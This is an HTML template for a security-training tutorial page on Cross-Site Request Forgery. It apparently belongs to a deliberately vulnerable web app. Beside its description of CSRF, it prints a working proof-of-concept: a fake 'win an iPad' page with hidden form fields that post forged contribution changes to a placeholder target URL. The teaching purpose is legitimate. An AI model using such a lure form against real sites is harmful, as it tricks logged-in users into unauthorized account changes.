{% extends './tutorial/layout.html' %}
{% block title %}A8-Cross-Site Request Forgery (CSRF) {% endblock %}
{% block content %}
<div class="row">
    <div class="col-lg-12">
        <div class="bs-example" style="margin-bottom: 40px;">
              <span class="label label-warning">Exploitability: AVERAGE</span>
              <span class="label label-warning">Prevalence: COMMON</span>
              <span class="label label-danger">Detectability: EASY</span>
              <span class="label label-warning">Technical Impact: MODERATE</span>
        </div>
    </div>
</div>

<div class="row">
    <div class="col-lg-12">

        <div class="panel panel-info">
            <div class="panel-heading">
                <h3 class="panel-title">Description</h3>
            </div>
            <div class="panel-body">
       	        A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.
            </div>
        </div>

       <div class="panel panel-info">
            <div class="panel-heading">
            <h3 class="panel-title"> Real World Attack Incident Examples</h3>
        </div>
        <div class="panel-body">
          Screencast here ...
        </div>
       </div>
               <div class="panel panel-info">
        <div class="panel-heading">
          <h3 class="panel-title"> Attack Scenario Demo</h3>
        </div>
        <div class="panel-body">
            Screencast showing how attack can manifest in the target application ...
        </div>
       </div>
       <div class="panel panel-info">
        <div class="panel-heading">
          <h3 class="panel-title"> Attack Mechanics </h3>
        </div>
        <div class="panel-body">
           <p>
              The application should should set CSRF Token in form in a hidden field. This vulnerability can be explotied on contributions form by executing this form in browser while a user is logged in.
                <pre>
                &lt;html lang="en"&gt;
                &lt;head&gt;&lt;/head&gt;
                	&lt;body&gt;
                		&lt;form method="POST" action="http://TARGET_APP_URL_HERE/contributions"&gt;
                			&lt;h1&gt; You are about to win a brand new iPad!&lt;/h1&gt;
                			&lt;h2&gt; Click on the win button to claim it...&lt;/h2&gt;
                			&lt;input type="hidden" name="pretax" value="30"/&gt;
                			&lt;input type="hidden" name="roth" value="30"/&gt;
                			&lt;input type="hidden" name="aftertax" value="30"/&gt;
                			&lt;input type="submit" value="Win !!!"/&gt;
                		&lt;/form&gt;
                	&lt;/body&gt;
                &lt;/html&gt;
              </pre>
            </p>
        </div>
       </div>
        <div class="panel panel-info">
            <div class="panel-heading">
                <h3 class="panel-title">How Do I Prevent It? </h3>
            </div>
                <div class="panel-body">
        			Fixed code Snippet + Screencast ...
    		</div>
       </div>
    </div>
 </div>
 {% endblock %}